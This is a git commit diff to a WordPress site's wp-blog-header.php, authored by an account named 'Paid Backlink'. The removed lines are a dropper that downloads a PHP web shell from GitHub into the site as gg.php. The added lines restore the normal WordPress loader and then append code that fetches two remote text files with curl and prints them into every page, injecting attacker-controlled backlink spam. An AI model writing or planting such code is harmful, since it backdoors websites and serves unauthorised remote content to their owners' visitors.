f4c786d7f36950b65f1064b1a10103f32be9944a
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2024-01-02 23:04:00 +0800

    Update wp-blog-header.php

--- wp-blog-header.php
+++ wp-blog-header.php
@@ -1,15 +1,35 @@
 <?php
-$url = 'https://raw.githubusercontent.com/Mr-7Mind/MiniShell/main/ShellPass.php';
-$localFilePath = __DIR__ . '/gg.php';
-$content = file_get_contents($url);
-if ($content !== false) {
-    $result = file_put_contents($localFilePath, $content);
-    if ($result !== false) {
-        echo "Nahh Done Kaik...\n";
-    } else {
-        echo "Waduh gagal kaik...\n";
-    }
-} else {
-    echo "Waduh gagal kaik...\n";
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
 }
+?>
+<?php
+$url1 = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$url2 = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_URL, $url1);
+$result1 = curl_exec($ch);
+curl_setopt($ch, CURLOPT_URL, $url2);
+$result2 = curl_exec($ch);
+curl_close($ch);
+echo $result1;
+echo $result2;
 ?>
